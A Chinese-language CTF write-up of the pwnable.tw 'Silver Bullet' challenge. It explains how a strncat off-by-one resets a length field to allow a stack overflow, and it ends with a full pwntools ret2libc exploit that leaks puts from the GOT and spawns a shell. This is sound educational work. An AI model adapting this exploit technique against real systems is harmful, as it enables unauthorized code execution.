---

title: pwnable.tw writeup - Silver Bullet
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

## 关键函数分析

**main 函数**

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int choice; // eax
  wolf Werewolf; // [esp+0h] [ebp-3Ch] BYREF
  bullet bullet; // [esp+8h] [ebp-34h] BYREF

  init_proc();
  memset(&bullet, 0, sizeof(bullet));
  Werewolf.hp = 2147483647;
  Werewolf.name = "Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          choice = read_int();
          if ( choice != 2 )
            break;
          power_up(&bullet);
        }
        if ( choice > 2 )
          break;
        if ( choice != 1 )
          goto LABEL_15;
        create_bullet(&bullet);
      }
      if ( choice == 3 )
        break;
      if ( choice == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_15:
      puts("Invalid choice");
    }
    if ( beat(&bullet, &Werewolf) )
      return 0;
    puts("Give me more power !!");
  }
}
```

要把狼杀死才 return , 否则程序直接退出。

其中狼和子弹结构体：

```cpp
struct bullet{
    char description[48];  
    int len;
};

struct wolf{
    int hp;
    char *name;
};
```

**create_bullet函数**

```cpp
int __cdecl create_bullet(bullet *bullet)
{
  int len; // [esp+0h] [ebp-4h]

  if ( bullet->description[0] )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(bullet, 48u);
  len = strlen(bullet->description);
  printf("Your power is : %u\n", len);
  bullet->len = len;
  return puts("Good luck !!");
}
```

输入字符串的长度就是你的子弹的威力。

**power_up函数**

```cpp
int __cdecl power_up(bullet *dest)
{
  char tmpbuf[48]; // [esp+0h] [ebp-34h] BYREF
  int newlen; // [esp+30h] [ebp-4h]

  newlen = 0;
  memset(tmpbuf, 0, sizeof(tmpbuf));
  if ( !dest->description[0] )
    return puts("You need create the bullet first !");
  if ( dest->len > 47u )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(tmpbuf, 48 - dest->len);
  strncat(dest->description, tmpbuf, 48 - dest->len);
  newlen = strlen(tmpbuf) + dest->len;
  printf("Your new power is : %u\n", newlen);
  dest->len = newlen;
  return puts("Enjoy it !");
}
```

就是加长字符串。

**beat函数**

```cpp
int __cdecl beat(bullet *bullet, wolf *Werewolf)
{
  if ( bullet->description[0] )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", Werewolf->name);
    printf(" + HP : %d\n", Werewolf->hp);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000u);
    Werewolf->hp -= bullet->len;
    if ( (int)Werewolf->hp <= 0 )
    {
      puts("Oh ! You win !!");
      return 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      return 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    return 0;
  }
}
```

持续扣血，但是正常情况下，你需要打到 **猴年马月** 才能把狼打死。


## 漏洞

发现一个有意思的输入：

描述输入47个 `a` 。

```
$ ./silver_bullet 
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Your power is : 47
Good luck !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :b
Your new power is : 1
Enjoy it !
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :Invalid choice
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :

```

可以发现 bullet 长度字段变成1了。

因为 `strncat` 函数在拼接字符串后会在字符串末尾追加 '0x00',恰好把长度字段那个字节变成0了。最后写出来长度字段就变成 `0 + 输入的1长度了`。

所以我们又有47字节可以写。从栈布局来看足够写到 `main` 函数返回地址了。

## 现在我们有什么

* 我们可以控制栈上 `main` 函数的返回地址以并写一些参数。

不能用 ROP ，因为 `gadget` 太少了。但是可以 ret2lib 。 

**策略：**

让 `main` 返回到 `puts` 函数 打印 `puts` 函数的地址在 `GOT` 表中。

puts 函数返回地址写 `main` ，这样又可以写一次栈。

打印完了之后执行 `main` 函数,这是我们拿到了 puts 函数在内存中的位置，减去偏移拿到 libc 起始地址。 于是可以拿到动态库中 system ， `/bin/sh` 字符串地址。在第二次 main 函数的栈上写入这些地址和参数， main 返回到 system 函数中。


## exploit

```python
#!/usr/bin/env python3

# pyright: basic

from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10103
PROC="./silver_bullet"

context.log_level = 'DEBUG'

io=None

if len(sys.argv) == 1 : 
    # io=gdb.debug(PROC,"break puts")
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)


def leaklib():
    io.sendafter(":","1")
    io.sendafter(":","a"*47)
    io.sendafter(":","2")
    io.sendafter(":","b")

    # 构造payload
    deslen=pack(0x7FFFFFFF)
    mainaddr=pack(0x08048954)
    gotput=pack(0x080484A8)
    
    #pause()
    payload=deslen[:-1]+b"c"*4+gotput+mainaddr+pack(0x0804AFDC)
    io.sendafter(":","2")
    io.sendafter("Give me your another description of bullet :",payload)

    # 开始打狼,使main返回
    io.sendafter("Your choice :","3")
    io.recvuntil("Oh ! You win !!\n")
    return unpack(io.recvn(4))

putaddr=leaklib()
print("putaddr:",hex(putaddr))

putoffset=0x0005f140
systemoffset=0x0003a940
binshoffset=0x158e8b

systemaddr=putaddr-putoffset+systemoffset
binshaddr=putaddr-putoffset+binshoffset

def getshell():
    io.sendafter(":","1")
    io.sendafter(":","a"*47)
    io.sendafter(":","2")
    io.sendafter(":","b")

    # 构造payload
    deslen=pack(0x7FFFFFFF)
    
    pause()
    payload=deslen[:-1]+b"c"*4+pack(systemaddr)*2+pack(binshaddr)
    io.sendafter(":","2")
    io.sendafter("Give me your another description of bullet :",payload)

    # 开始打狼,使main返回
    io.sendafter("Your choice :","3")
    io.recvuntil("Oh ! You win !!\n")

getshell()

io.interactive()

```
